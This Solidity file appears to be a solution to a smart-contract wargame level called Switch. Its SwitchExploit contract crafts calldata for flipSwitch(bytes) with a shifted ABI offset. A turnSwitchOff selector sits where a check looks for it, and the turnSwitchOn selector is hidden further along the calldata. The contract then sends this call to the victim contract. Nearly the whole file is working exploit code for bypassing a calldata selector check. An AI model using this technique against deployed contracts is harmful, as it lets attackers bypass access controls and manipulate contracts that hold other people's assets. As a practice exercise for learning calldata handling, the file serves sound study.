// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "../../src/Switch/Switch.sol";
import "../BlockUtils.sol";
import "forge-std/console.sol";


contract SwitchExploit is BlockUtils {
    Switch victim;
    
    constructor(address _victim) {
        victim = Switch(payable(_victim));

    }

    function hack() public {

    bytes4 offSelector = bytes4(keccak256("turnSwitchOff()"));
    bytes4 onSelector = bytes4(keccak256("turnSwitchOn()"));

    // console.log("offSelector: ");
    // console.logBytes4(offSelector);


    // bytes4 onSelector = bytes4(keccak256("turnSwitchOn()"));

    // try to encode a call to flipSwitch with the offSelector
    // bytes memory payload = abi.encodeWithSignature("flipSwitch(bytes _data)", abi.encodeWithSelector(offSelector));

    bytes memory malicious_on_call = abi.encodeWithSignature("flipSwitch(bytes)",0x60,0,offSelector,4, onSelector); // change offset to three bytes instead of two and add onSelector at the end. 
    
    console.log("malicious_on_call: ");
    console.logBytes(malicious_on_call);

    
    // Make the call with this malicious data
    address(victim).call(malicious_on_call);

    }   

    
}